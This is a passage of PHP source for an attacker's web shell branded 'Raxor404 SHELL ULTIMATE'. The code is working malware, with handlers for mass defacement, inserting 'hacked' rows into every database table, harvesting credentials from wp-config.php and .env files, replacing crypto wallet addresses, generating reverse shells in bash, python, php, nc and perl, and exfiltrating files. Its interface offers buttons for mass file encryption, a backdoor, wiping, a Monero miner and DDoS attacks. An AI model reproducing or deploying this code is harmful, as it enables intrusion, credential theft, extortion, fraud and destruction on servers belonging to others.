            @file_put_contents($f, $html);
            $count++;
        }
    }
    $output = "🔥 Defaced $count files!\nPath: $targetPath";
    $showOutput = true;
}

// SQL INJECTION MASSAL
if ($action == 'sqlinject' && isset($_POST['db_user']) && isset($_POST['db_pass'])) {
    try {
        $pdo = new PDO("mysql:host=".($_POST['db_host'] ?? 'localhost'), $_POST['db_user'], $_POST['db_pass']);
        $dbs = $pdo->query("SHOW DATABASES")->fetchAll();
        $count = 0;
        foreach($dbs as $db){
            if(!in_array($db['Database'], ['information_schema','mysql','performance_schema','phpmyadmin','sys'])){
                $pdo->query("USE {$db['Database']}");
                $tables = $pdo->query("SHOW TABLES")->fetchAll();
                foreach($tables as $table){
                    $tableName = reset($table);
                    $pdo->query("INSERT INTO $tableName VALUES ('hacked','by','Raxor404','".date('Y-m-d H:i:s')."')");
                    $count++;
                }
            }
        }
        $output = "💉 SQL Inject successful! $count tables affected!";
    } catch(Exception $e) {
        $output = '⚠️ ERROR: '.$e->getMessage();
    }
    $showOutput = true;
}

// SQL QUERY
if ($action == 'sql' && isset($_POST['query']) && isset($_POST['host']) && isset($_POST['user']) && isset($_POST['pass'])) {
    try {
        $pdo = new PDO("mysql:host=".$_POST['host'].";dbname=".($_POST['db'] ?? 'mysql'), $_POST['user'], $_POST['pass']);
        $stmt = $pdo->query($_POST['query']);
        $res = $stmt->fetchAll(PDO::FETCH_ASSOC);
        $output = print_r($res, true);
    } catch(Exception $e) {
        $output = '⚠️ ERROR: '.$e->getMessage();
    }
    $showOutput = true;
}

// MAILER
if ($action == 'mail' && isset($_POST['to']) && isset($_POST['subject']) && isset($_POST['message'])) {
    $headers = "From: shell@Raxor404.com\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=UTF-8\r\n";
    $mailResult = mail($_POST['to'], $_POST['subject'], $_POST['message'], $headers);
    $output = $mailResult ? "✅ Mail sent to ".$_POST['to'] : "❌ Mail failed";
    $showOutput = true;
}

// PORT SCANNER
if ($action == 'portscan' && isset($_POST['host']) && isset($_POST['ports'])) {
    $host = $_POST['host'];
    $ports = explode(',', $_POST['ports']);
    $results = scanPorts($host, $ports);
    $output = "🔍 Port Scan Results for $host:\n";
    foreach($results as $port => $status){
        $output .= ($status == 'OPEN' ? '✅' : '❌') . " Port $port: $status\n";
    }
    $showOutput = true;
}

// DNS ENUM
if ($action == 'dnsenum' && isset($_POST['domain'])) {
    $domain = $_POST['domain'];
    $output = "🌐 DNS Enumeration for $domain:\n";
    $output .= "--- A Records ---\n".safeCmd("host $domain 2>&1");
    $output .= "\n--- NS Records ---\n".safeCmd("nslookup -type=NS $domain 2>&1");
    $output .= "\n--- MX Records ---\n".safeCmd("nslookup -type=MX $domain 2>&1");
    $output .= "\n--- TXT Records ---\n".safeCmd("nslookup -type=TXT $domain 2>&1 | head -10");
    $showOutput = true;
}

// WHOIS LOOKUP
if ($action == 'whois' && isset($_POST['domain'])) {
    $domain = $_POST['domain'];
    $output = "📋 WHOIS Lookup for $domain:\n".safeCmd("whois $domain 2>&1 | head -60");
    $showOutput = true;
}

// PASSWORD GRABBER
if ($action == 'grabber') {
    $results = [];
    if(file_exists($real.'/wp-config.php')){
        $wp = @file_get_contents($real.'/wp-config.php');
        preg_match_all("/define\(['\"](DB_NAME|DB_USER|DB_PASSWORD|DB_HOST)['\"],\s*['\"]([^'\"]*)['\"]\)/", $wp, $matches);
        if(!empty($matches[2])) $results['WordPress'] = $matches[2];
    }
    if(file_exists($real.'/.env')){
        $env = @file_get_contents($real.'/.env');
        preg_match_all("/^(.*?)=(.*?)$/m", $env, $matches);
        if(!empty($matches[2])) $results['ENV'] = $matches[2];
    }
    if(file_exists($real.'/config.php')){
        $cfg = @file_get_contents($real.'/config.php');
        preg_match_all("/['\"](DB_|PASSWORD|SECRET|API_)[^'\"]*['\"]\s*=>\s*['\"]([^'\"]*)['\"]/", $cfg, $matches);
        if(!empty($matches[2])) $results['Config'] = $matches[2];
    }
    $configs = explode("\n", safeCmd("find $real -type f \( -name '*.conf' -o -name 'config.php' -o -name '*.ini' -o -name '*.json' -o -name '*.yaml' -o -name '*.yml' \) 2>/dev/null | head -20"));
    $results['Config Files'] = array_filter($configs);
    $output = print_r($results, true);
    $showOutput = true;
}

// CRYPTO WALLET REPLACER
if ($action == 'cryptoreplace' && isset($_POST['old_wallet']) && isset($_POST['new_wallet'])) {
    $old = $_POST['old_wallet'];
    $new = $_POST['new_wallet'];
    $files = explode("\n", safeCmd("find $real -type f \( -name '*.php' -o -name '*.js' -o -name '*.html' -o -name '*.txt' -o -name '*.json' -o -name '*.py' \) 2>/dev/null"));
    $count = 0;
    foreach($files as $f){
        if(file_exists($f) && is_file($f)){
            $content = @file_get_contents($f);
            if(strpos($content, $old) !== false){
                @file_put_contents($f, str_replace($old, $new, $content));
                $count++;
            }
        }
    }
    $output = "💰 Replaced $old with $new in $count files!";
    $showOutput = true;
}

// REVERSE SHELL GENERATOR
if ($action == 'reverse' && isset($_POST['host']) && isset($_POST['port'])) {
    $host = $_POST['host'];
    $port = $_POST['port'];
    $method = $_POST['method'] ?? 'bash';
    $cmds = [
        'bash' => "bash -i >& /dev/tcp/$host/$port 0>&1",
        'python' => "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$host\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        'php' => "php -r '\$s=fsockopen(\"$host\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        'nc' => "nc -e /bin/sh $host $port",
        'perl' => "perl -e 'use Socket;\$i=\"$host\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
    ];
    $cmd = $cmds[$method] ?? $cmds['bash'];
    $output = "🔄 Reverse shell command:\n$cmd\n\nListener: nc -lvnp $port";
    $showOutput = true;
}

// SYSTEM INFO
if ($action == 'info') {
    $info = getServerInfo();
    $info['CPU'] = getCPUInfo();
    $info['Memory'] = getMemoryInfo();
    $info['Disk'] = getDiskInfo();
    $info['Uptime'] = safeCmd("uptime");
    $info['Load'] = getSystemLoad();
    $info['Users'] = getUsers();
    $info['Last Logins'] = getLastLogins();
    $info['Cron Jobs'] = getCronJobs();
    $info['MySQL Credentials'] = getMySQLCredentials();
    $info['SSH Keys'] = getSSHKeys();
    $info['Apache Config'] = getApacheConfig();
    $info['SSH Config'] = getSSHConfig();
    $info['Firewall Rules'] = getFirewallRules();
    $info['DNS Config'] = getDNSConfig();
    $info['Open Ports'] = getOpenPorts();
    $info['Running Services'] = getRunningServices();
    $info['Network'] = getNetworkInfo();
    $info['Web Roots'] = getWebRoots();
    $info['Env Vars'] = getEnvVars();
    $info['PHP Config File'] = getPHPConfigFile();
    $info['Loaded Extensions'] = getLoadedExtensions();
    $info['PHP INI Settings'] = getIniSettings();
    $info['Filesystem'] = getFilesystemInfo();
    $info['Environment'] = getEnvironment();
    $info['SELinux'] = getSELinuxStatus();
    $info['Fail2ban'] = getFail2banStatus();
    $info['Server Time'] = date('Y-m-d H:i:s');
    $info['Time Zone'] = getTimeZoneInfo();
    $output = print_r($info, true);
    $showOutput = true;
}

// PHPINFO
if ($action == 'phpinfo') {
    phpinfo();
    exit;
}

// PROCESS VIEWER
if ($action == 'process') {
    $output = getRunningProcesses(30);
    $showOutput = true;
}

// NETWORK INFO
if ($action == 'network') {
    $output = getNetworkConnections();
    $showOutput = true;
}

// FIREWALL STATUS
if ($action == 'firewall') {
    $output = getFirewallStatus();
    $showOutput = true;
}

// DATABASE BACKUP
if ($action == 'dbbackup' && isset($_POST['db_host']) && isset($_POST['db_user']) && isset($_POST['db_pass']) && isset($_POST['db_name'])) {
    $output = getDatabaseBackup($_POST['db_host'], $_POST['db_user'], $_POST['db_pass'], $_POST['db_name']);
    $showOutput = true;
}

// FILE SEARCH
if ($action == 'filesearch' && isset($_POST['filesearch']) && isset($_POST['searchtext'])) {
    $results = searchInFiles($_POST['filesearch'], $_POST['searchtext'], $_POST['extension'] ?? '');
    $output = "🔍 Search Results:\nFound in ".count($results)." files:\n\n";
    $output .= implode("\n", $results);
    $showOutput = true;
}

// FILE REPLACE
if ($action == 'filereplace' && isset($_POST['filereplace']) && isset($_POST['replaceold']) && isset($_POST['replacenew'])) {
    $count = replaceInFiles($_POST['filereplace'], $_POST['replaceold'], $_POST['replacenew'], $_POST['extension'] ?? '');
    $output = "✅ Replaced in $count files!";
    $showOutput = true;
}

// DIRECTORY TREE
if ($action == 'tree') {
    $output = getDirectoryTree($real, 0, 4);
    $showOutput = true;
}

// DOWNLOAD FILE FROM URL
if ($action == 'wget' && isset($_POST['wget_url']) && isset($_POST['wget_path'])) {
    $url = $_POST['wget_url'];
    $path = $_POST['wget_path'];
    if(downloadFile($url, $path)){
        $output = "✅ Downloaded: $url -> $path";
    } else {
        $output = "❌ Download failed!";
    }
    $showOutput = true;
}

// UPLOAD FILE TO SERVER
if ($action == 'uploadremote' && isset($_POST['uploadremote_file']) && isset($_POST['uploadremote_url'])) {
    $file = $_POST['uploadremote_file'];
    $url = $_POST['uploadremote_url'];
    if(uploadToServer($file, $url)){
        $output = "✅ Uploaded: $file -> $url";
    } else {
        $output = "❌ Upload failed!";
    }
    $showOutput = true;
}

// FILE INFO
if ($action == 'fileinfo' && isset($_POST['fileinfo'])) {
    $file = $_POST['fileinfo'];
    if(file_exists($file)){
        $info = [
            'name' => basename($file),
            'size' => formatSize(filesize($file)),
            'perms' => getPerm($file),
            'owner' => function_exists('posix_getpwuid') ? posix_getpwuid(fileowner($file))['name'] : 'N/A',
            'mtime' => date('Y-m-d H:i:s', filemtime($file)),
            'mime' => getFileMimeType($file),
            'md5' => md5_file($file),
            'sha1' => sha1_file($file),
            'sha256' => hash_file('sha256', $file)
        ];
        $output = print_r($info, true);
    } else {
        $output = "❌ File not found!";
    }
    $showOutput = true;
}

// ── HTML UI ──────────────────────────────────────────────────────────
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Raxor404 SHELL ULTIMATE v9.0</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0a;color:#00ff41;font-family:'Courier New',monospace;padding:10px}
.container{max-width:1400px;margin:0 auto;background:#0d0d0d;border:1px solid #00ff41;border-radius:10px;padding:12px;box-shadow:0 0 60px rgba(0,255,65,0.03)}
.header{display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px;border-bottom:2px solid #00ff41;padding-bottom:8px;margin-bottom:10px}
.header h1{font-size:18px;text-shadow:0 0 30px rgba(0,255,65,0.3)}
.header h1 span{color:#ff0040}
.header .status{font-size:9px;color:#888;background:#1a1a1a;padding:3px 8px;border-radius:15px;border:1px solid #2a2a2a}
.path-bar{background:#111;padding:5px 8px;border-radius:5px;margin-bottom:8px;font-size:10px;border:1px solid #1a1a1a;display:flex;flex-wrap:wrap;gap:3px;word-break:break-all}
.path-bar a{color:#00ff41;text-decoration:none}
.path-bar a:hover{text-shadow:0 0 20px #00ff41}
.tools{display:flex;flex-wrap:wrap;gap:2px;margin-bottom:8px;padding:4px 0;border-bottom:1px solid #1a1a1a;max-height:180px;overflow-y:auto}
.tools::-webkit-scrollbar{width:3px;background:#1a1a1a}
.tools::-webkit-scrollbar-thumb{background:#00ff41;border-radius:2px}
.tools a,.tools button{background:transparent;border:1px solid #2a2a2a;color:#00ff41;padding:2px 6px;border-radius:3px;font-family:inherit;font-size:8px;cursor:pointer;text-decoration:none;transition:all 0.2s;white-space:nowrap}
.tools a:hover,.tools button:hover{background:#00ff41;color:#0a0a0a;border-color:#00ff41}
.tools .danger{border-color:#ff0040;color:#ff0040}
.tools .danger:hover{background:#ff0040;color:#0a0a0a}
.tools .warning{border-color:#ffaa00;color:#ffaa00}
.tools .warning:hover{background:#ffaa00;color:#0a0a0a}
.tools .special{border-color:#ff00ff;color:#ff00ff}
.tools .special:hover{background:#ff00ff;color:#0a0a0a}
.tools .info{border-color:#00ccff;color:#00ccff}
.tools .info:hover{background:#00ccff;color:#0a0a0a}
.form-group{background:#111;padding:8px;border-radius:5px;margin-bottom:8px;border:1px solid #1a1a1a}
.form-group .row{display:flex;flex-wrap:wrap;gap:4px}
.form-group .row input,.form-group .row textarea,.form-group .row select{flex:1;min-width:60px;background:#1a1a1a;border:1px solid #2a2a2a;color:#00ff41;padding:4px 6px;border-radius:3px;font-family:inherit;font-size:10px}
.form-group .row input:focus{outline:none;border-color:#00ff41}
.form-group .row textarea{min-height:30px;width:100%;resize:vertical}
.form-group .row .btn{background:transparent;border:1px solid #00ff41;color:#00ff41;padding:4px 10px;border-radius:3px;cursor:pointer;font-family:inherit;font-size:10px;transition:0.2s;flex:0 0 auto}
.form-group .row .btn:hover{background:#00ff41;color:#0a0a0a}
.form-group .row .btn-danger{border-color:#ff0040;color:#ff0040}
.form-group .row .btn-danger:hover{background:#ff0040;color:#0a0a0a}
.form-group .row .btn-warning{border-color:#ffaa00;color:#ffaa00}
.form-group .row .btn-warning:hover{background:#ffaa00;color:#0a0a0a}
.warning-box{background:#1a0a0a;border:1px solid #ff0040;padding:6px;border-radius:4px;margin-bottom:6px}
.warning-box h3{color:#ff0040;font-size:11px}
.warning-box p{color:#ff6666;font-size:9px}
.output{background:#111;padding:8px;border-radius:5px;margin-top:8px;border:1px solid #1a1a1a;white-space:pre-wrap;word-wrap:break-word;max-height:300px;overflow-y:auto;font-size:10px;line-height:1.3;color:#00ff41}
.table-wrap{overflow-x:auto;border-radius:5px;border:1px solid #1a1a1a;margin-top:6px}
table{width:100%;border-collapse:collapse;font-size:10px}
th{background:#111;color:#00ff41;padding:4px 6px;text-align:left;border-bottom:2px solid #00ff41}
td{padding:4px 6px;border-bottom:1px solid #151515}
tr:hover td{background:#111}
td a{color:#00ff41;text-decoration:none}
td .actions a{margin:0 2px;font-size:11px;opacity:0.7}
td .actions a:hover{opacity:1}
.footer{text-align:center;margin-top:10px;font-size:8px;color:#444;border-top:1px solid #1a1a1a;padding-top:8px}
.footer span{color:#ff0040}
@media(max-width:768px){body{padding:5px}.container{padding:8px}.header h1{font-size:14px}.tools a,.tools button{padding:2px 4px;font-size:7px}.form-group .row input,.form-group .row textarea{font-size:9px;padding:3px 4px}th,td{padding:3px 4px;font-size:8px}}
</style>
</head>
<body>
<div class="container">
<div class="header">
<h1>⬡ Raxor404 SHELL <span>ULTIMATE v9.0</span></h1>
<div class="status">⚡ <?= php_uname('n') ?> &nbsp;|&nbsp; <?= date('H:i:s') ?></div>
</div>

<div class="path-bar">
<?php
$parts = explode(DIRECTORY_SEPARATOR, $real);
$tmp = '';
echo '📂 ';
foreach ($parts as $p) {
    if ($p) {
        $tmp .= $p . DIRECTORY_SEPARATOR;
        echo '<a href="?path='.urlencode($tmp).'&pass='.$PASSWORD.'">'.$p.'</a><span class="sep"> / </span>';
    }
}
?>
</div>

<div class="tools">
<!-- File Manager -->
<a href="?pass=<?=$PASSWORD?>">🏠 Home</a>
<a href="?action=mkdir&pass=<?=$PASSWORD?>">📁 +Folder</a>
<a href="?action=touch&pass=<?=$PASSWORD?>">📄 +File</a>
<a href="?action=upload&pass=<?=$PASSWORD?>">📤 Upload</a>
<a href="?action=edit&pass=<?=$PASSWORD?>">✏️ Edit</a>
<a href="?action=rename&pass=<?=$PASSWORD?>">📝 Rename</a>
<a href="?action=copy&pass=<?=$PASSWORD?>">📋 Copy</a>
<a href="?action=move&pass=<?=$PASSWORD?>">📦 Move</a>
<a href="?action=chmod&pass=<?=$PASSWORD?>">🔐 Chmod</a>
<a href="?action=fileinfo&pass=<?=$PASSWORD?>" class="info">ℹ️ Info</a>

<!-- System -->
<a href="?action=cmd&pass=<?=$PASSWORD?>">💻 CMD</a>
<a href="?action=info&pass=<?=$PASSWORD?>" class="info">🛡️ Info</a>
<a href="?action=process&pass=<?=$PASSWORD?>" class="info">📊 Process</a>
<a href="?action=network&pass=<?=$PASSWORD?>" class="info">🌐 Network</a>
<a href="?action=firewall&pass=<?=$PASSWORD?>" class="info">🔥 Firewall</a>
<a href="?action=phpinfo&pass=<?=$PASSWORD?>" class="info">🐘 PHPInfo</a>
<a href="?action=tree&pass=<?=$PASSWORD?>" class="info">🌳 Tree</a>

<!-- Search -->
<a href="?action=find&pass=<?=$PASSWORD?>">🔍 Find</a>
<a href="?action=grep&pass=<?=$PASSWORD?>">🔎 Grep</a>
<a href="?action=replace&pass=<?=$PASSWORD?>">🔄 Replace</a>
<a href="?action=filesearch&pass=<?=$PASSWORD?>" class="info">🔍 Search</a>
<a href="?action=filereplace&pass=<?=$PASSWORD?>" class="warning">🔄 Replace</a>

<!-- Archive -->
<a href="?action=zipall&pass=<?=$PASSWORD?>" class="warning">📦 Zip</a>
<a href="?action=unzip&pass=<?=$PASSWORD?>" class="warning">📂 Unzip</a>

<!-- Database -->
<a href="?action=sql&pass=<?=$PASSWORD?>" class="info">🗄️ SQL</a>
<a href="?action=sqlinject&pass=<?=$PASSWORD?>" class="danger">💉 SQLi</a>
<a href="?action=dbbackup&pass=<?=$PASSWORD?>" class="info">💾 Backup</a>

<!-- Network Tools -->
<a href="?action=portscan&pass=<?=$PASSWORD?>" class="info">🔍 Port</a>
<a href="?action=dnsenum&pass=<?=$PASSWORD?>" class="info">🌐 DNS</a>
<a href="?action=whois&pass=<?=$PASSWORD?>" class="info">📋 Whois</a>
<a href="?action=mail&pass=<?=$PASSWORD?>">📧 Mail</a>

<!-- Download/Upload -->
<a href="?action=wget&pass=<?=$PASSWORD?>" class="info">⬇️ Wget</a>
<a href="?action=uploadremote&pass=<?=$PASSWORD?>" class="info">⬆️ Upload</a>

<!-- Brutal -->
<a href="?action=encryptall&pass=<?=$PASSWORD?>" class="danger">🔒 Encrypt All</a>
<a href="?action=decryptall&pass=<?=$PASSWORD?>" class="warning">🔓 Decrypt All</a>
<a href="?action=encryptfile&pass=<?=$PASSWORD?>" class="danger">🔒 Encrypt File</a>
<a href="?action=decryptfile&pass=<?=$PASSWORD?>" class="warning">🔓 Decrypt File</a>
<a href="?action=backdoor&pass=<?=$PASSWORD?>" class="danger">🔒 Backdoor</a>
<a href="?action=wipe&pass=<?=$PASSWORD?>" class="danger">🧹 Wipe</a>
<a href="?action=killmonitor&pass=<?=$PASSWORD?>" class="danger">☠️ Kill</a>
<a href="?action=miner&pass=<?=$PASSWORD?>" class="warning">⛏️ Miner</a>
<a href="?action=ddos&pass=<?=$PASSWORD?>" class="danger">💀 DDOS</a>
<a href="?action=deface&pass=<?=$PASSWORD?>" class="danger">🔥 Deface</a>
<a href="?action=cryptoreplace&pass=<?=$PASSWORD?>" class="warning">💰 Crypto</a>
<a href="?action=grabber&pass=<?=$PASSWORD?>" class="warning">🔑 Grab</a>
<a href="?action=reverse&pass=<?=$PASSWORD?>" class="special">🔄 Reverse</a>
</div>

<?php
// ── FORMS ──────────────────────────────────────────────────────────
if ($action == 'mkdir') {
    echo '<div class="form-group"><form method="POST"><div class="row"><input type="text" name="folder" placeholder="Folder name..." required><button type="submit" class="btn">✅ Create</button></div></form></div>';
}

if ($action == 'touch') {
    echo '<div class="form-group"><form method="POST"><div class="row"><input type="text" name="file" placeholder="File name..." required><button type="submit" class="btn">✅ Create</button></div></form></div>';
}

if ($action == 'upload') {
    echo '<div class="form-group"><form method="POST" enctype="multipart/form-data"><div class="row"><input type="file" name="file" required><button type="submit" class="btn">📤 Upload</button></div></form></div>';
}

if ($action == 'cmd') {
    echo '<div class="form-group"><form method="POST"><div class="row"><input type="text" name="cmd" placeholder="Command..." autofocus required><button type="submit" class="btn">⚡ Execute</button></div></form></div>';
}

if ($action == 'find') {
    echo '<div class="form-group"><form method="POST"><div class="row"><input type="text" name="find" placeholder="Search file/folder..." required><button type="submit" class="btn">🔍 Search</button></div></form></div>';
}

if ($action == 'grep') {
    echo '<div class="form-group"><form method="POST"><div class="row"><input type="text" name="grep" placeholder="Path..." value="."><input type="text" name="search" placeholder="Search text..." required><button type="submit" class="btn">🔎 Grep</button></div></form></div>';
}

if ($action == 'replace') {
    echo '<div class="form-group"><form method="POST"><div class="row"><input type="text" name="replace" placeholder="Path..." value="."><input type="text" name="old" placeholder="Old text..." required><input type="text" name="new" placeholder="New text..." required><button type="submit" class="btn">🔄 Replace</button></div></form></div>';
}

if ($action == 'copy') {
    echo '<div class="form-group"><form method="POST"><div class="row"><input type="text" name="copy" placeholder="Source file..." required><input type="text" name="dest" placeholder="Destination..." required><button type="submit" class="btn">📋 Copy</button></div></form></div>';
}

if ($action == 'move') {
    echo '<div class="form-group"><form method="POST"><div class="row"><input type="text" name="move" placeholder="Source file..." required><input type="text" name="dest" placeholder="Destination..." required><button type="submit" class="btn">📦 Move</button></div></form></div>';
}

if ($action == 'chmod') {
    echo '<div class="form-group"><form method="POST"><div class="row"><input type="text" name="chmod" placeholder="File path..." required><input type="text" name="perm" placeholder="Permission (e.g. 777)" value="777" required><button type="submit" class="btn">🔐 Chmod</button></div></form></div>';
}

if ($action == 'fileinfo') {
    echo '<div class="form-group"><form method="POST"><div class="row"><input type="text" name="fileinfo" placeholder="File path..." required><button type="submit" class="btn btn-info">ℹ️ Info</button></div></form></div>';
}

if ($action == 'encryptall') {
    echo '<div class="form-group"><div class="warning-box"><h3>🔒 ENKRIPSI MASSAL</h3><p>Semua file di path akan di-ENKRIPSI! Shell otomatis di-skip!</p></div><form method="POST"><div class="row"><input type="text" name="encrypt_path" placeholder="📂 Path target" value="'.$real.'" required><input type="text" name="encrypt_key" placeholder="🔑 Key"></div><div class="row" style="margin-top:4px;"><button type="submit" class="btn btn-danger" style="flex:1;padding:8px;">🔒 ENKRIPSI SEMUA FILE</button></div></form></div>';
}

if ($action == 'decryptall') {
    echo '<div class="form-group"><div class="warning-box"><h3>🔓 DEKRIPSI MASSAL</h3><p>Dekripsi semua file yang terenkripsi!</p></div><form method="POST"><div class="row"><input type="text" name="decrypt_path" placeholder="📂 Path target" value="'.$real.'" required><input type="text" name="decrypt_key" placeholder="🔑 Key" required></div><div class="row" style="margin-top:4px;"><button type="submit" class="btn btn-warning" style="flex:1;padding:8px;">🔓 DEKRIPSI SEMUA FILE</button></div></form></div>';
}

if ($action == 'encryptfile') {
    echo '<div class="form-group"><form method="POST"><div class="row"><input type="text" name="encrypt_file" placeholder="📄 Path file" required><input type="text" name="encrypt_file_key" placeholder="🔑 Key"></div><div class="row" style="margin-top:4px;"><button type="submit" class="btn btn-danger">🔒 ENKRIPSI FILE</button></div></form></div>';
}

if ($action == 'decryptfile') {
    echo '<div class="form-group"><form method="POST"><div class="row"><input type="text" name="decrypt_file" placeholder="📄 Path file" required><input type="text" name="decrypt_file_key" placeholder="🔑 Key" required></div><div class="row" style="margin-top:4px;"><button type="submit" class="btn btn-warning">🔓 DEKRIPSI FILE</button></div></form></div>';
}

if ($action == 'zipall') {
    echo '<div class="form-group"><form method="POST"><div class="row"><input type="text" name="zip_path" placeholder="📂 Path to zip" value="'.$real.'" required><button type="submit" class="btn btn-warning">📦 ZIP ALL</button></div></form></div>';
}

if ($action == 'unzip') {
    echo '<div class="form-group"><form method="POST"><div class="row"><input type="text" name="unzip_file" placeholder="📄 ZIP file path" required><input type="text" name="unzip_path" placeholder="📂 Extract to" required><button type="submit" class="btn btn-warning">📂 UNZIP</button></div></form></div>';
}

if ($action == 'sql') {
    echo '<div class="form-group"><form method="POST"><div class="row"><input type="text" name="host" placeholder="Host" value="localhost"><input type="text" name="user" placeholder="User" value="root"><input type="text" name="pass" placeholder="Password"><input type="text" name="db" placeholder="Database" value="mysql"></div><div class="row" style="margin-top:4px;"><textarea name="query" placeholder="SQL Query..." required></textarea></div><div class="row" style="margin-top:4px;"><button type="submit" class="btn btn-warning">💉 Execute</button></div></form></div>';
}

if ($action == 'sqlinject') {
    echo '<div class="form-group"><div class="warning-box"><h3>💉 MASS SQL INJECTOR</h3><p>Inject semua database & table!</p></div><form method="POST"><div class="row"><input type="text" name="db_host" placeholder="Host" value="localhost"><input type="text" name="db_user" placeholder="User" value="root"><input type="text" name="db_pass" placeholder="Password"></div><div class="row" style="margin-top:4px;"><button type="submit" class="btn btn-danger">💉 INJECT ALL</button></div></form></div>';
}

if ($action == 'dbbackup') {
    echo '<div class="form-group"><form method="POST"><div class="row"><input type="text" name="db_host" placeholder="Host" value="localhost"><input type="text" name="db_user" placeholder="User" value="root"><input type="text" name="db_pass" placeholder="Password"><input type="text" name="db_name" placeholder="Database" required></div><div class="row" style="margin-top:4px;"><button type="submit" class="btn btn-info">💾 Backup</button></div></form></div>';
}

if ($action == 'mail') {
    echo '<div class="form-group"><form method="POST"><div class="row"><input type="email" name="to" placeholder="To..." required><input type="text" name="subject" placeholder="Subject..."><input type="text" name="message" placeholder="Message..."></div><div class="row" style="margin-top:4px;"><button type="submit" class="btn">📨 Send</button></div></form></div>';
}

if ($action == 'ddos') {
    echo '<div class="form-group"><div class="warning-box"><h3>💀 DDOS ATTACK</h3><p>Serang target dengan ribuan koneksi!</p></div><form method="POST"><div class="row"><input type="text" name="target" placeholder="IP Target..." required><input type="number" name="port" placeholder="Port" value="80"><input type="number" name="threads" placeholder="Threads" value="1000"><input type="number" name="duration" placeholder="Duration (sec)" value="60"><select name="method"><option value="tcp">TCP</option><option value="http">HTTP</option></select><button type="submit" class="btn btn-danger">🔥 START</button></div></form></div>';
}

if ($action == 'deface') {
    echo '<div class="form-group"><div class="warning-box"><h3>🔥 DEFACE MASSAL</h3><p>Ganti semua file PHP/HTML!</p></div><form method="POST"><div class="row"><input type="text" name="deface" placeholder="Path target..." required></div><div class="row" style="margin-top:4px;"><textarea name="html" placeholder="HTML deface..." style="min-height:40px;"></textarea></div><div class="row" style="margin-top:4px;"><button type="submit" class="btn btn-danger">🔥 DEFACE</button></div></form></div>';
}

if ($action == 'miner') {
    echo '<div class="form-group"><div class="warning-box"><h3>⛏️ CRYPTO MINER</h3><p>Mining menggunakan CPU target!</p></div><form method="POST"><div class="row"><input type="text" name="miner_pool" placeholder="Pool (e.g. pool.supportxmr.com:3333)" value="pool.supportxmr.com:3333" required><input type="text" name="miner_wallet" placeholder="Wallet address" required></div><div class="row" style="margin-top:4px;"><button type="submit" class="btn btn-warning">⛏️ START MINING</button></div></form></div>';
}

if ($action == 'cryptoreplace') {
    echo '<div class="form-group"><div class="warning-box"><h3>💰 CRYPTO WALLET REPLACER</h3><p>Replace all wallet addresses!</p></div><form method="POST"><div class="row"><input type="text" name="old_wallet" placeholder="Old wallet address..." required><input type="text" name="new_wallet" placeholder="New wallet address..." required></div><div class="row" style="margin-top:4px;"><button type="submit" class="btn btn-warning">💰 REPLACE</button></div></form></div>';
}

if ($action == 'portscan') {
    echo '<div class="form-group"><form method="POST"><div class="row"><input type="text" name="host" placeholder="Host/IP..." required><input type="text" name="ports" placeholder="Ports (comma separated)" value="21,22,23,25,53,80,110,135,139,143,443,445,993,995,1723,3306,3389,5900,8080"></div><div class="row" style="margin-top:4px;"><button type="submit" class="btn btn-info">🔍 SCAN</button></div></form></div>';
}

if ($action == 'dnsenum') {
    echo '<div class="form-group"><form method="POST"><div class="row"><input type="text" name="domain" placeholder="Domain..." required><button type="submit" class="btn btn-info">🌐 ENUM</button></div></form></div>';
}

if ($action == 'whois') {
    echo '<div class="form-group"><form method="POST"><div class="row"><input type="text" name="domain" placeholder="Domain/IP..." required><button type="submit" class="btn btn-info">📋 LOOKUP</button></div></form></div>';
}

if ($action == 'grabber') {
    echo '<div class="form-group"><div class="warning-box"><h3>🔑 PASSWORD GRABBER</h3><p>Grab passwords from config files!</p></div><form method="POST"><div class="row"><button type="submit" class="btn btn-warning">🔑 GRAB</button></div></form></div>';
}

if ($action == 'reverse') {
    echo '<div class="form-group"><div class="warning-box"><h3>🔄 REVERSE SHELL</h3><p>Generate reverse shell command!</p></div><form method="POST"><div class="row"><input type="text" name="host" placeholder="Your IP..." required><input type="number" name="port" placeholder="Port..." value="4444" required><select name="method"><option value="bash">Bash</option><option value="python">Python</option><option value="php">PHP</option><option value="nc">Netcat</option><option value="perl">Perl</option></select><button type="submit" class="btn btn-special">🔄 Generate</button></div></form></div>';
}

if ($action == 'wget') {
    echo '<div class="form-group"><form method="POST"><div class="row"><input type="text" name="wget_url" placeholder="URL to download..." required><input type="text" name="wget_path" placeholder="Save path..." required><button type="submit" class="btn btn-info">⬇️ Download</button></div></form></div>';
}

if ($action == 'uploadremote') {
    echo '<div class="form-group"><form method="POST"><div class="row"><input type="text" name="uploadremote_file" placeholder="File path..." required><input type="text" name="uploadremote_url" placeholder="Upload URL..." required><button type="submit" class="btn btn-info">⬆️ Upload</button></div></form></div>';
}

if ($action == 'filesearch') {
    echo '<div class="form-group"><form method="POST"><div class="row"><input type="text" name="filesearch" placeholder="Path..." value="." required><input type="text" name="searchtext" placeholder="Search text..." required><input type="text" name="extension" placeholder="Extension (e.g. php)"></div><div class="row" style="margin-top:4px;"><button type="submit" class="btn btn-info">🔍 Search</button></div></form></div>';
}

if ($action == 'filereplace') {
    echo '<div class="form-group"><form method="POST"><div class="row"><input type="text" name="filereplace" placeholder="Path..." value="." required><input type="text" name="replaceold" placeholder="Old text..." required><input type="text" name="replacenew" placeholder="New text..." required><input type="text" name="extension" placeholder="Extension (e.g. php)"></div><div class="row" style="margin-top:4px;"><button type="submit" class="btn btn-warning">🔄 Replace</button></div></form></div>';
}

// ── RENAME FORM ────────────────────────────────────────────────────
if ($action == 'rename' && isset($_REQUEST['target'])) {
